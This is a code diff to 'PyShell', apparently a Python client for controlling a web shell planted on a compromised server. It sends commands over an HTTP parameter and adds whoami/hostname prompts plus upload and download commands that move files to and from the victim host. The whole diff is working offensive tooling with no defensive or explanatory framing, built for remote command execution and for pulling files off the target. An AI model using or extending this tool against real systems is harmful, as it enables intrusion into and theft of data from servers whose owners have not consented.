@@ -42,20 +42,40 @@ try:
     WEBSHELL = args.url
     HTTP_METHOD = args.method
     PARAM = args.param
+    whoami = send_command('whoami', WEBSHELL, HTTP_METHOD, PARAM)
+    hostname = send_command('hostname', WEBSHELL, HTTP_METHOD, PARAM)
 
     while True:
        try:
-          command = input(colored("PyShell $> ", "green"))
+          print (colored("[PyShell] ", "green"), end = '')
+          command = input(colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" $> ", "blue"))
           if command == "exit":
              print (colored("Exiting..\n", "red"))
              break
           else:
-             if args.ps:
-                result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                print (colored(result, "yellow"))
+             if "upload" in command.split()[0]: 
+                localfile = command.split()[1]
+                remotefile = command.split()[2]
+                print (colored("Uploading file "+ localfile +" on "+ remotefile +"..\n", "yellow"))
+                f = open(localfile, "r")
+                rawfiledata = f.read()
+                upload = send_command("echo " + rawfiledata.rstrip() + (' > ') + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
              else:
-                result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                print (colored(result, "yellow"))
+                if "download" in command.split()[0]: 
+                   remotefile = command.split()[1]
+                   localfile = command.split()[2]
+                   print (colored("Downloading file "+ remotefile +" on "+ localfile +"..\n", "yellow"))
+                   download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                   f = open(localfile, "w")
+                   f.write(download)
+                   f.close
+                else:
+                   if args.ps:
+                      result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                      print (colored(result, "yellow"))
+                   else:
+                      result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                      print (colored(result, "yellow"))
 
        except KeyboardInterrupt:
           print (colored("\nExiting..\n", "red"))
